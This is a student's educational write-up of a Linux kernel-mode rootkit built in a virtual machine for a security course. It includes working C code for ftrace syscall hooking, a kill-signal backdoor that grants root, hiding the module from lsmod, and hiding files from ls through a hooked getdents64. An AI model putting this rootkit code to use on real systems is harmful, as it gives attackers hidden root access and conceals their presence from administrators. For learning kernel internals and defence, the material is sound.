# Table of Contents
- [Overview](#overview)
- [Kernel Modules](#kernel-modules)
- [Function Hooking & Ftrace](#function-hooking---ftrace)
- [Gaining Root Privilege](#gaining-root-privilege)
- [Hiding Kernel Modules](#hiding-kernel-modules)
- [Hiding Directories](#hiding-directories)
- [Preventions](#preventions)
- [Challenges](#challenges)
- [Reflections](#reflections)
- [References](#references)
- [Repository](#repository)
  
# Overview
A rootkit is software used by cybercriminals to gain control over a target computer or network. Rootkits can sometimes appear as a single piece of software but are often made up of a collection of tools that allow hackers administrator-level control over the target device.

There are several types of rootkit:

 1. Hardware/Firmware rootkit - attacks on hardrive
 2. Bootloader rootkit - replace legitimate bootloader with malicious one
 3. Memory rootkit - stay in RAM, affect RAM performance and do malicious activities
 4. Kernel mode rootkit

For my Something Awesome Project, I tried to implement kernel mode rootkit as a way to learn about the capabilities of them on attacking our computer and improving knowledge about operating systems! 

# Kernel Modules
When we compile a normal C program, it produces a \*.o (object) file. For kernel modules (C programs that interacts with the kernel), it produces a \*.ko (kernel object) file instead. It's worth noting that kernel modules are dealing with stuff in the *kernel level privileges* (ring 0). Hence, most of our work is invisible to the userspace, but this could be a double-edged sword where kernel could crash itself and our computer is broken.

This is when ***VM*** coming in action to save us from shooting in our foot. In this project, I used **Oracle VM VirtualBox** as my VM and **Vagrant** as my development environment on top of the VM.

## Building Kernel Modules
I will be using these commands quite frequent throughout the project (assuming my kernel module is `rootkit.c`), which are:
```bash
make # Run Makefile so it makes rootkit.ko (kernel object) file
sudo insmod rootkit.ko # Install this module into kernel
dmesg # Show output by printk() in kernel module
sudo rmmod rootkit # Remove module from kernel, undo any changes by the module. 
				   # We don't need the ".ko" at the end in this case
```

Now we can take a look at the essential parts of a kernel module. The first part is including essential header files from the Linux Kernel source code. We also used some predefined macros to add some details to the module.
```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Luong Thang Nguyen");
MODULE_DESCRIPTION("Basic Kernel Module");
MODULE_VERSION("0.01");
```
Now here comes the "meat" of our kernel module, which are the *init* and *exit* functions. `example_init` is called when the module is loaded into the kernel, and `example_exit` is called when the module is unloaded. 

Note that the identifier `__init` and `__exit` are what determines whether the role of the corresponding function, not the name of the function. At the end we also need to call `module_init` and `module_exit` to register these functions as the entry/exit point of the module.
```c
static int __init example_init(void)
{
    printk(KERN_INFO "Hello, world!\n");
    return 0;
}

static void __exit example_exit(void)
{
    printk(KERN_INFO "Goodbye, world!\n");
}

module_init(example_init);
module_exit(example_exit);
```
# Function Hooking & Ftrace

## Syscalls
Before diving into syscalls, let's have a look of the two main modes in our Linux kernel:
### Kernel (privileged) mode

-   Has direct access to the computer resources
    
-   If it crashes, the whole computer dies 🙁
    
### User mode

-   A safer place for programs to execute on. If it crashes, we can still propagate the error to the kernel to handle.
    
-   May need to have access to computer resources, hence use **syscalls** to switch to kernel mode (context switching)
    
As mentioned right above, **syscalls** are the interface which user uses to interact with the kernel in order to perform privileged operations. In other words, **syscalls** can be considered as the entry point from the user mode to the kernel mode!

## Overview of Ftrace
Ftrace acts as a framework where kernel developers can utilized to trace and investigate what was going inside the kernel. One of the very nice feature of Ftrace is the ability to attach a callback function into a function in the kernel. 

We will be utilizing this feature in order to attach our defined function into the original syscall. 

The main idea is that, whenever the `rip` register (instruction pointer register) contains a certain memory address (we defined that when we wanna hook), Ftrace will step in to execute the attached function.

 For example, we can define that whenever the `rip` register contains the memory address of the `syscall_mkdir` function, **Ftrace** needs to step in and call our own version of `mkdir`.
    

## More about Ftrace

We would also introduce some helper functions from [ftrace_helpers.h](https://github.com/luongthang0105/Linux-Rootkit/blob/main/ftrace_helper.h) (this is the header file written by my main source of reference, my work would be in `rootkit.c`).

In the main kernel module, we initialize the hooked functions:
```c
static struct ftrace_hook hooks[] = {  
	HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),  
};
```
Then we use `fh_install_hooks` to “install” hook (in this case `hook_mkdir`) into our syscall (in this case, hook_mkdir into `sys_mkdir`)
```c
fh_install_hooks(hooks, ARRAY_SIZE(hooks));
```
Behind the scene, these are what **ftrace_helper.h** do to install the hooks:	
1. First, it gets the function pointer of the original syscall and save it in the internal struct.
2. Then, it changes the `ip` register points to the function pointer of our **hook function**. 
3. Finally, it registers that modification to the kernel. Now our **hook function** will be executed whenever the original one is invoked.

# Gaining Root Privilege

## Overview of UIDs in Linux

-   0-99 are UIDs reserved for system users. They cannot login as “normal” users (aka via the terminal), except for “root” (UID=0).
    
-   UID helps us define different users in the same computer. This is quite nice because it acts as a layer of privacy within resources in the computer.

-   For example, we should be running a PostgreSQL server in our system using the postgres  user. This is useful to prevent vulnerabilities escaping from the application, because it does not have access to resources hosted by other users.
    
## Main Task
`kill -signal_id pid` is a syscall that sends a signal to the process with pid. We often use it to kill a signal via `kill -9 pid` because 9 is the **`SIGKILL`** signal, as defined in [signal.h](https://github.com/torvalds/linux/blob/3e5e6c9900c3d71895e8bdeacfb579462e98eba1/arch/x86/include/uapi/asm/signal.h#L31).

In this part, we define a `signal_id` of our own, in this case it’s 64 (because the existing signals was only up to **32**, so we can choose some number out of that range) , and whenever our hook sees this signal, it’s going to set the `uid` to 0 (which is the root uid).
  
## Implementation
First, let's have a look at our hooking function:
```c
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);

    int sig = regs->si;

    if (sig == 64)
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(regs);
}
```
There's a bit to unwrap here! First, we have `regs` of type `struct pt_regs` in as our only argument. For (64-bit) kernel version 4.17.0, syscalls only take in `struct pt_regs` that contains values of all register. 

Hence, in order to take out the desired arguments from this big struct of registers, we can take a look at [Linux Syscall Reference](https://syscalls64.paolostivanin.com/) to see which register corresponds to which argument. 
**![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXd9JthzQt6FBkAdoOESJiAaZt8tg1-6TpXKDfvkyEZt2UoUi_ovUd-iFViP0ELz8fs5r96Rt1ZUqM6inKtarDmz9bgAY8yKOESG7b47QkNr6uqU9WsrnMa8jGjULC5Hi6ryUcZFgTRYcax6aLHAEOC0M_zJ?key=8gWUuztVdypWUJCrXgpmWzsr)**
For `sys_kill` it's `rsi` register is the one that holds the signal value!
Now when `sig` is 64, we would like to give the current process root privilege via calling `set_root`:
```c
if (sig == 64)
{
    printk(KERN_INFO "rootkit: giving root...\n");
    set_root();
    return 0;
}
```
In order to set root priviledge, we can alter the current process's credential, which is defined as follow in the kernel:
```c
struct cred {
    /* redacted */

    kuid_t      uid;    /* real UID of the task */
    kgid_t      gid;    /* real GID of the task */
    kuid_t      suid;   /* saved UID of the task */
    kgid_t      sgid;   /* saved GID of the task */
    kuid_t      euid;   /* effective UID of the task */
    kgid_t      egid;   /* effective GID of the task */
    kuid_t      fsuid;  /* UID for VFS ops */
    kgid_t      fdgid;  /* GID for VFS ops */

    /* redacted */
}
```
Since we only care about root privileges, we can simply set all these to 0.
According to the kernel [documentation](https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials), we need to call `prepare_creds` to get the current version of credentials. Then we can modify it and install the changes by calling `commit_creds`:
```c
void set_root(void)
{
    struct cred *root;
    root = prepare_creds();
    if (root == NULL)
        return;
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}
```

## Notes About Changing Credentials of A Process.
-   A process CANNOT change other processes’ credentials. This imposes a **security barrier** to prevent malicious processes affecting other processes. 
-  However,  a process can still modify its own credentials.
-  When a process is altering its credentials, it uses a **mutex** to prevent race conditions raised by ptrace() (another system call that may alter credentials as a side-effect).

## Demonstration!

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe5sC1V41chMrLpCt3jkeOpObLwIDpZGzV6_VQKImYid0vKNPVauutB3Edb29BvPg0cZ9OIEgh4koZYvRBuCvbxYZh8bRnm1uWvadA8yCNAuLjQdVINDst2LMU6O9UpmKvUYsaJRNnL9zQXgN6R?key=8gWUuztVdypWUJCrXgpmWzsr)

# Hiding Kernel Modules
In this part, we will be looking at **hiding kernel modules from userspace**! In particular, we will add this functionality to the current `hook_kill()` callback. Recall that we used `64` as a signal number to change the process credentials, in this case we would use `63` for hiding the rootkit!

## Overview
### lsmod
- a command to list out the status of **loaded** modules in the kernel
### Kernel Module Struct
Each kernel module has a `struct` attached to it, storing information about itself. The `struct` were made available to the kernel module in [include/linux/export.h](https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/export.h#L16):
```c
#ifdef MODULE
extern struct module __this_module;
#define THIS_MODULE (&__this_module)
#else
#define THIS_MODULE ((struct module *)0)
#endif
```
This means that we can access to `__this_module` by the `THIS_MODULE` macro.

Take a look at [here](https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/module.h#L364), where Linux defines `struct module`:
```c
struct module {
    enum module_state state;
    
    /* Member of list of modules */
    struct list_head list;

    /* Unique handle for this module */
    char name[MODULE_NAME_LEN];

    /* More stuff we aren't interested in... */
};
```
It's essential to point out that **modules** are saved as a linked list, and each `struct module` is a member of that linked list.

Moreover, this linked list is indeed a doubly linked list, as defined in [include/linux/types.h](https://github.com/torvalds/linux/blob/3e5e6c9900c3d71895e8bdeacfb579462e98eba1/include/linux/types.h#L193):
```c
struct list_head {
	struct list_head *next, *prev;
};
```
For a concrete example, say we have this output when running `lsmod` command:
<img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXfphMMYmvPxOUtlE--scIf4f3A_jKOXPYtGg9w3be4DZ2TvjpauqKrIF-VDYT6viTFkAiLxGeHv-oZHuhkOayzEDYJ9qZuzp0JFeq850RVn1ZaZky5B5qnfQIKV0KDscuEgoixFQOqgYTG2oKOFn6Q_1FJ3?key=8gWUuztVdypWUJCrXgpmWzsr"></img>

`rootkit` is currently the very first module in the list, so 
`(&THIS_MODULE->list)->next` in `rootkit.c` will be the result in a pointer to `joydev` module. Similarly, `(&THIS_MODULE->list)->prev` will be `null`, since the previous node of the first node does not exist.

Hence, we will try to manipulate `(&THIS_MODULE->list)` in a way that it would hide **and** unhide itself from the module list!
## Business Logic
We will first declare these two static variables:
```c
static bool hidden = 0; // hiding state of rootkit                                            
static struct list_head *prev_save; // previous module of rootkit
```
And some modifications to our `hook_kill()` function:
```c
if (sig == 64)
{
    printk(KERN_INFO "rootkit@hook_kill: giving root...\n");
    set_root();
    return 0;
} else if (sig == 63) {
	// 63 is our new signal number for hiding rootkit!
    if (hidden == 0) {
		printk(KERN_INFO "rootkit@hook_kill: hiding rootkit from module lists\n");
        hide_mod();
    } else {
		printk(KERN_INFO "rootkit@hook_kill: unhiding rootkit from module lists\n");
		show_mod();
    }
    hidden = hidden ^ 1;
}
```
As in the code block above, we chose `63` to be our signal number for hiding rootkit. We also alter the value of `hidden` everytime we use call `kill -63 pid`  by **XOR**-ing it with 1 (it changes 1 to 0 and vice-versa). This effectively means that we unhide our process by calling `kill -63 pid` again.

Now let's take a look at `hide_mod()` and `show_mod()`:
```c
void hide_mod(void) {
    prev_save = (&THIS_MODULE->list)->prev;
    list_del(&THIS_MODULE->list);
}
void show_mod(void) {
	list_add(&THIS_MODULE->list, prev_save);
}
```
`hide_mod()` saves the previous node in `prev_save` so that `show_mod()` can use it later to add the module back to the module list. Notice that we got `list_del()` and `list_add()` built in from `linux/list.h` which was very helpful as well!

### How can we still add the module back after deleting it?
It's essential to point out that `list_del` only remove our module from the module list by letting `(&THIS_MODULE->list)->prev` points to `(&THIS_MODULE->list)->next`. The `struct module` for our kernel module is still staying in memory and can be access by `THIS_MODULE`.
 
### Is our module completely *safe* from detection after this?
Since our kernel module is still in memory, it can still be traced by memory analysis or digital forensic tools! So the answer is **NO**, our kernel module is not 100% invisible from the system.

## Demonstration!
In this demo, the first `kill` call hides the rootkit, and the second `kill` call unhides it. I used `lsmod` to demonstrate the presence of `rootkit`.

<img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXfdNYTMkV1CHQpmjSkJnV2LEP_fwEyW8q1l6FglN4XOIv_oLAn9SzqEc8gtFC959ky56lsaXX10Df1uB7F75hZzPqsA__ayz1QEZ2mQHazX6yRH4as3tyxx17QF_OkXH1XrUUVWmvrzjmQkzRbGJilj-yFX?key=8gWUuztVdypWUJCrXgpmWzsr"></img>

# Hiding Directories
In this part, we will take a look at how can our rootkit hides directories from the `ls` command in userspace. However, we first need to have a rough understanding of how   directories are handled in the kernel.
## Overview
### Directory Listing
Let's start with understanding the underlying functionalities that support directory listing by running `strace ls`, a command that helps us see what system calls were invoked when using `ls`. We are particularly interested in one system call:
```
getdents64(3, /* 19 entries */, 32768)  = 656
```
Coincidentally, I also have 19 files in my `rootkit` directory: 
**![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe1vcaCbehxk9kI5-36lSiJoV72LX3sbnfUDPxITB1C9SljCwf_DZNR97j7PfndGJhge64savUnSPfLGiktMMlyXF6WRXsBtGxy6JFY2Cc6doAnqX4Uv_CJzKYwMQK7hx9CT5z38rhCt1t4GkJlh7q-YIQ?key=8gWUuztVdypWUJCrXgpmWzsr)**
According to [man page](https://linux.die.net/man/2/getdents64), `getdents64` is a syscall that reads files within a directory and returns the total size of them in bytes.

Each file is stored in a `linux_dirent64` (dirent stands for "directory entry") struct, which is defined as the following:
```c
struct linux_dirent64 {
    u64         d_ino;
    s64         d_off;
    unsigned short      d_reclen;
    unsigned char       d_type;
    char        d_name[];
};
```
We are interested at `d_reclen` which specifies the length of that `linux_dirent64` struct and `d_name` which would be helpful to determine which file to hide.

`d_reclen` is also what the kernel use to determine the next file in the listing. This [example](https://linux.die.net/man/2/getdents64#:~:text=d%20=%20%28struct%20linux_dirent%20*%29%20%28buf%20+%20bpos%29;) is a great demonstration of how `d_reclen` could be use to iterate through every file in the directory.

## Approach
 1. Create a buffer for our defined dirent struct. This is what we will send back to the userspace so they got the modified version of directory listing.
 2. Copy userspace dirent struct into our defined dirent struct. Make sure to use `copy_from_user` to avoid memory issues.
 3. Loop through each file in dirent struct, if the name matches some predefined string (say "rootkit"?), we skip it.
 > Say file B is the one that we want to hide, and file A is the one right before file B in directory listing. We can skip file B by adding `d_reclen` of file B to `d_reclen` of file A! This is because we are iterating through each file by incrementing their own `d_reclen`, hence `d_reclen` of file A now will be large enough that we would jump over file B when iterating.

 > There's also an edge case where file B is the first file in the listing. In this case, we would ***move*** every entries after file B up by using `memmove`. Doing this would overwrite the memory of `struct linux_dirent64` of file B with the ones after file B. We also need to subtract file B `d_reclen` from the total length of the listing.
 4. Copy our defined dirent struct back to the user dirent struct by using `copy_to_user`.
 5. Don't forget to return the final length of our directory listing.

## Implementation Details
I've added comments along with code, which should be descriptive enough:
```c
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
	// take dirent from userspace out from rsi register
	struct linux_dirent64 __user *user_dirent = (struct linux_dirent64 *)regs->si;
	
	// for skipping entries
	struct linux_dirent64 *previous_entry;
	// for keep track current entry
	struct linux_dirent64 *current_entry;
	// kernel version of dirent, this is what we will modify on and copy back to userspace
	struct linux_dirent64 *new_dirent;
	
	// acts kinda like an index to determine next dirent
	unsigned long offset = 0;
	
	// get the original total length by running the original getdents64 syscall
	int retval = orig_getdents64(regs);


	// allocate same amount of bytes into our new_dirent
	new_dirent = kzalloc(retval, GFP_KERNEL);


	if ( (retval <= 0) || (new_dirent == NULL) )
        return retval;


    long error;
    error = copy_from_user(new_dirent, user_dirent, retval);
    if(error)
        goto done;


    while (offset < retval)
    {
        current_entry = (void *)new_dirent + offset;
		
		// if file name matches PREFIX , hide it from listing
        if ( memcmp(PREFIX, current_entry->d_name, strlen(PREFIX)) == 0)
        {
            /* Check for the special case when we need to hide the first entry */
            if( current_entry == new_dirent )
            {
                /* Decrement ret and shift all the structs up in memory */
                retval -= current_entry->d_reclen;
                memmove(current_entry, (void *)current_entry + current_entry->d_reclen, retval);
                continue;
            }
            /* Hide the secret entry by incrementing d_reclen of previous_entry by
             * that of the entry we want to hide - effectively "swallowing" it
             */
            previous_entry->d_reclen += current_entry->d_reclen;
        }
        else
        {
            /* Set previous_entry to current_entry before looping where current_entry
             * gets incremented to the next entry
             */
            previous_entry = current_entry;
        }


        offset += current_entry->d_reclen;
    }


    error = copy_to_user(user_dirent, new_dirent, retval);
    if(error)
        goto done;


done:
    kfree(new_dirent);
    return retval;
}
```
## Demonstration!
**![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdWbdfHWX8OevOpovb4vVr6JaxUygGhxWtJJfudjERUarhYjWl7ykqejGjs9e2DHrHBPP1A3YDzsubBcFSkpv52QeDNEBr03WNdSWkrXoT8HFC7YJg9yesmtW2-wyAFFSo8uMFIB4bYApv261lERRQtJLo?key=8gWUuztVdypWUJCrXgpmWzsr)**

# Preventions
Rootkits are dangerous but hard to detect at the same time, so it's best to follow the idea mentioned repeatedly in Richard's lecture: "Prevention is better than cure".

In particular, we should adhere to these very simple advice:

 1. Keep your system up-to-date
	 > This is indeed very important. New vulnerabilities are being exploited at a very frequent occasion so getting that new version of your OS is the number one way to keep your computer from hackers.
 2. Download files from trusted source
	 > Be careful when you download executable files on the internet. You should do a small check on the internet on whether the website is legit or not. Even if it is confirmed by many people that it's legit, a slight chance of error could possibly slip through.
 3. Be aware of your computer's performance
	 > If your CPU's or Disk's performance are 100% all the time, it's a good indication that there's a malicious process running in the background. Don't be someone else's crypto miner!!!
 4. Use a well-known cybersecurity software
	 > Windows user may have Windows Defender under their belt, but some extra layer of securities is always better.


# Challenges
## Setup Challenges
I found a lot of challenges when getting started with the projects. First of all is the setup for VM and Vagrant. This is the very first time I've ever installed VMs so there was many unexpected errors coming up.

One of which was that I was not able to run Vagrant after installing it, but it magically works after a few days of neglecting it!

Another was that Vagrant could not boot up the VM (also after a few days of not using it), which at one point made me reinstall everything can code back from scratch. 

## Technical Challenges
The Linux Kernel is huge and I struggled so much to understand their code. I recall pulling up 20 tabs of Linux Kernel source code to trace down a type that was just finally defined as a `u16`. 

The documentation about some part of the code were just too vague to understand and some of them are not very direct to me. For example, my source of reference mentions that [this](https://github.com/torvalds/linux/blob/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs/readdir.c#L373C3-L373C66) code is an indicator that we can traverse directory entries by their `d_reclen`, even though there is not any `for` loop or  addition of `d_reclen` (as I expected so).

I also struggled a lot when documentations are already there, such as this part about process [credentials](https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials). Even though it's clear that I should do XYZ, but the urge to understand any related stuff kind of made me had a harder time to move on with other important parts.
# Reflections
Despite having such technical challenges, I'm confident that I've learnt much more from the difficulties. 

Compare to myself before this term 3, my knowledge about the Linux Kernel were obviously much less than right now. I realize that it comes with experience and effort to get the hang of developing low-level code. 

This project gives me a wide range of vocabularies within the Linux Kernel that it would benefit me so much in coming up with ideas on how tackle a kernel-level problem. 

However, the most important take away is the recognition of the capabilities of rootkit. With just a few weeks of researching and developing, I was able to make a program that hides itself from the user, hides directories so they could not be found with normal `ls` command, and getting the root access just by a simple `kill` command on the terminal. 

Having this acknowledgement of the powerful of rootkit, I'm also geared with the mindset "Prevention rather than cure" that I've learned in Richard's lecture!

Even though there are still a few parts that I have yet to complete, this project would still go beyond this course and be a part of my learning journey. I am very grateful to have this opportunity given by COMP6841 to explore something is **totally** out of my comfort zone.

# References
 1. [TheXcellerator](https://xcellerator.github.io/) - My main reference for developing this rootkit.
	 1. [Rootkit Intro & Setup](https://xcellerator.github.io/posts/linux_rootkits_01/) 
	 2. [Using Ftrace For Function Hooking](https://xcellerator.github.io/posts/linux_rootkits_02/)
	 3. [Gaining Root Privilege](https://xcellerator.github.io/posts/linux_rootkits_03/)
	 4. [Hiding Kernel Modules](https://xcellerator.github.io/posts/linux_rootkits_05/)
	 5. [Hiding Directories](https://xcellerator.github.io/posts/linux_rootkits_06/)
 2. [torvalds/linux: Linux kernel source tree](https://github.com/torvalds/linux) - The Linux kernel source code.
 3. [Linux man pages](https://linux.die.net/man/) - The Linux man pages for syscall description details
 4. [Linux Syscall Reference](https://syscalls64.paolostivanin.com/) - syscall reference for which registers used
 5. [How to detect & prevent rootkits](https://www.kaspersky.com/resource-center/definitions/what-is-rootkit) - Overview of Rootkit by Kaspersky 

# Repository
This is my code repository for this project: [Linux-Rootkit](https://github.com/luongthang0105/Linux-Rootkit)

